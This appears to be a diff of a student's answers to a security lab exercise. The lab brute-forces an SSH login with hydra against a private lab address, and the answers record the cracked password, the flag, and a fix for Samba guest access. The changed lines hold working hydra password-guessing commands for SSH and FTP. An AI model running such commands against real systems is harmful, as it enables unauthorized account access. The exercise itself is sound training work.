@@ -66,7 +66,7 @@ You can use any wordlist you want, I just know that the password is guaranteed t
 What is the user’s password: corvette
 What is the flag in the the flag.txt file when logging in as that user?: you_found_bobs_flag
 What is the exact command you used to obtain the password (and how long did it take approximately):
-1. Command: hydra -t 4 -l bob -P darkweb.txt -vV 192.168.42.129 ssh
+1. Command: hydra -t 4 -l bob -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt -vV 192.168.42.129 ssh
 2. Time: Approximately 15 minutes
 
 6. What would be the steps to take to correct this vulnerabilityand to correctly configure the smb server. (high level one/two sentences explanation is ok).
@@ -74,7 +74,7 @@ Answer: Disable anonymous/guest access and require authenticated users for all s
         This prevents unauthorized access and hardens the Samba server against exploitation.
 
 7.  Assume that instead of an ssh server, you'd be using hydra to connect to an ftp server, what is the hydra command for this?
-Answer: hydra -t 4 -l bob -P darkweb.txt -vV -s 21 192.168.42.129 ftp
+Answer: hydra -t 4 -l bob -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt -vV -s 21 192.168.42.129 ftp
 
 8. What other file shareing servers/services do exist that hyrda can be used for?
 Answer:
